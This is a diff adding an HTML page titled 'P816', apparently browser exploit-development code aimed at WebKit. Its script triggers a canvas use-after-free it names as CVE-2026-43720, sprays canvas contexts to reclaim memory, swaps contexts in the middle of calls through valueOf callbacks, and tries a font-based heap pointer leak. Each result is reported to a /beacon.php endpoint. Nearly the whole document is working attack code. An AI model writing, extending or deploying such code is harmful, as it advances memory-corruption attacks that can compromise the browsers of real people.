@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P816</title>
+<style>
+body{background:#0d1117;color:#c9d1d9;font:13px monospace;margin:8px;}
+pre{color:#7ee787;background:#161b22;border:1px solid #30363d;padding:8px;border-radius:4px;white-space:pre-wrap;word-break:break-all;}
+</style>
+</head><body>
+<pre id="o">P816 — Mid-Call Context Replacement & Binding Lifecycle Diagnostic</pre>
+<script>
+'use strict';
+var O=document.getElementById('o');
+function log(s){O.textContent+='\n'+s;}
+function bn(t,d){
+  try{
+    var x=new XMLHttpRequest();
+    x.open('GET','/beacon.php?tag=P816-'+encodeURIComponent(t)+'&data='+encodeURIComponent(String(d||'').slice(0,900))+'&t='+Date.now(),false);
+    x.send();
+  }catch(e){}
+}
+function h16(v){return('0000000000000000'+BigInt(v||0).toString(16)).slice(-16);}
+
+bn('BOOT','v1');
+log('Starting P816...');
+
+/* ========== PHASE 1: Canvas UAF Reclaim (CVE-2026-43720) ========== */
+var innerCtx=null;
+var canvas=document.createElement('canvas');
+canvas.width=1;canvas.height=1;
+
+var opts={};
+Object.defineProperty(opts,'alpha',{
+  get:function(){
+    innerCtx=canvas.getContext('2d');
+    return true;
+  }
+});
+canvas.getContext('bitmaprenderer',opts);
+
+if(!innerCtx){
+  bn('FAIL','no_innerCtx');
+  log('FAIL: innerCtx not created');
+}else{
+  bn('UAF-OK','innerCtx_created');
+  log('UAF triggered');
+}
+
+/* Same-type spray */
+var SPRAY=300;
+var sprayCanvases=[];
+var sprayCtxs=[];
+var MARKER=7777.77;
+
+for(var i=0;i<SPRAY;i++){
+  var c=document.createElement('canvas');
+  c.width=1;c.height=1;
+  var ctx=c.getContext('2d');
+  ctx.lineWidth=MARKER;
+  sprayCanvases.push(c);
+  sprayCtxs.push(ctx);
+}
+
+var readLW;
+try{readLW=innerCtx.lineWidth;}catch(e){readLW=-1;}
+
+var aliasIdx=-1;
+if(readLW===MARKER){
+  innerCtx.lineWidth=9999.99;
+  for(var i=0;i<SPRAY;i++){
+    if(sprayCtxs[i].lineWidth===9999.99){
+      aliasIdx=i;
+      break;
+    }
+  }
+  bn('ALIAS','idx='+aliasIdx);
+  log('Aliased pair confirmed at index '+aliasIdx);
+}else{
+  bn('RECLAIM-MISS','lw='+readLW);
+  log('Reclaim missed, reloading...');
+  setTimeout(function(){location.reload();},300);
+}
+
+if(aliasIdx>=0){
+  var stale=innerCtx;
+  var live=sprayCtxs[aliasIdx];
+  var liveCanvas=sprayCanvases[aliasIdx];
+
+  /* ========== PHASE 2: Mid-Call Context Type Switch via valueOf ========== */
+  /*
+   * Tests whether calling getContext('bitmaprenderer') on liveCanvas
+   * while live.setLineDash() is actively converting arguments will:
+   *   a) Be blocked / rejected by WebKit's context lock
+   *   b) Replace m_context while setLineDash is on the call stack
+   *   c) Complete safely under RefPtr protection
+   */
+  var switchRan=false;
+  var switchResult='none';
+  var newBmpCtx=null;
+
+  var itemSwitch={
+    valueOf:function(){
+      switchRan=true;
+      try{
+        newBmpCtx=liveCanvas.getContext('bitmaprenderer');
+        switchResult=(newBmpCtx?'got_bmp':'bmp_null');
+      }catch(e){
+        switchResult='err_'+e.name;
+      }
+      return 42.0;
+    }
+  };
+
+  var outerCompleted=false;
+  var postDashLen=-1;
+  try{
+    live.setLineDash([10.0, itemSwitch, 30.0, 40.0]);
+    outerCompleted=true;
+    var postDash=live.getLineDash();
+    postDashLen=postDash.length;
+    bn('MIDCALL-SWITCH','ran='+switchRan+'|res='+switchResult+'|outer='+outerCompleted+'|dashLen='+postDashLen);
+    log('Mid-call switch: ran='+switchRan+' res='+switchResult+' outer='+outerCompleted+' dashLen='+postDashLen);
+  }catch(err){
+    bn('MIDCALL-SWITCH-ERR','ran='+switchRan+'|res='+switchResult+'|err='+err.name);
+    log('Mid-call switch error: '+err.name+': '+err.message);
+  }
+
+  /* ========== PHASE 3: Context Validity Inspection Post-Switch ========== */
+  var liveCtxValid=false;
+  var liveLwAfter=-1;
+  try{
+    liveLwAfter=live.lineWidth;
+    liveCtxValid=true;
+  }catch(e){}
+
+  var staleLwAfter=-1;
+  try{
+    staleLwAfter=stale.lineWidth;
+  }catch(e){}
+
+  bn('POST-SWITCH-STATE','liveValid='+liveCtxValid+'|liveLW='+liveLwAfter+'|staleLW='+staleLwAfter);
+  log('Post-switch state: liveValid='+liveCtxValid+' liveLW='+liveLwAfter+' staleLW='+staleLwAfter);
+
+  /* ========== PHASE 4: Document Detach during Sequence Conversion ========== */
+  /*
+   * Tests what happens if liveCanvas is removed from the DOM or attached to a new frame
+   * during the sequence conversion loop.
+   */
+  var detachCanvas=document.createElement('canvas');
+  detachCanvas.width=1;detachCanvas.height=1;
+  document.body.appendChild(detachCanvas);
+  var detachCtx=detachCanvas.getContext('2d');
+  detachCtx.lineWidth=5555.55;
+
+  var detachRan=false;
+  var detachItem={
+    valueOf:function(){
+      detachRan=true;
+      try{
+        document.body.removeChild(detachCanvas);
+        detachCanvas.width=0;
+        detachCanvas.height=0;
+      }catch(e){}
+      return 15.5;
+    }
+  };
+
+  var detachOuterOk=false;
+  try{
+    detachCtx.setLineDash([5.0, detachItem, 25.0, 35.0]);
+    detachOuterOk=true;
+    var dDetach=detachCtx.getLineDash();
+    bn('DETACH-TEST','ran='+detachRan+'|outer='+detachOuterOk+'|len='+dDetach.length);
+    log('Detach Test: ran='+detachRan+' outer='+detachOuterOk+' len='+dDetach.length);
+  }catch(e){
+    bn('DETACH-TEST-ERR',e.message);
+  }
+
+  /* ========== PHASE 5: Font Heap Anchor ========== */
+  try{
+    var st=document.createElement('style');
+    st.textContent="@font-face{font-family:p816b;src:local(Arial);unicode-range:U+0042;}";
+    document.head.appendChild(st);
+    var ff=new FontFace('p816f',"local('Helvetica')",{unicodeRange:'U+0041'});
+    document.fonts.add(ff);
+    void ff.loaded;
+
+    var ffAbs=[],ffFired=false;
+    Object.defineProperty(FontFace.prototype,'then',{
+      configurable:true,
+      get:function(){
+        if(ffFired)return undefined;
+        ffFired=true;
+        if(st){st.remove();st.textContent='';}
+        try{document.fonts.delete(this);}catch(e){}
+        document.body.offsetHeight;
+        ffAbs=[];
+        for(var a=0;a<64;a++)ffAbs.push(new ArrayBuffer(192));
+        try{document.fonts.check('1em p816b');}catch(e){}
+        document.body.offsetHeight;
+        return undefined;
+      },set:function(){}
+    });
+    document.fonts.load('1em p816f, p816b','AB');
+
+    setTimeout(function(){
+      delete FontFace.prototype.then;
+      var leak='none';
+      for(var a=0;a<ffAbs.length;a++){
+        var bu=new BigUint64Array(ffAbs[a]);
+        if(bu.length>=14 && bu[11]>0x1000000000n){
+          leak='0x'+h16(bu[11]);
+          break;
+        }
+      }
+      bn('FONT-LEAK',leak);
+      log('Font Heap Reference: '+leak);
+      bn('DONE','complete|aliasIdx='+aliasIdx);
+      log('P816 complete.');
+    },200);
+  }catch(err){
+    bn('FONT-ERR',err.message);
+    bn('DONE','complete_with_font_err');
+  }
+}
+</script>
+</body></html>
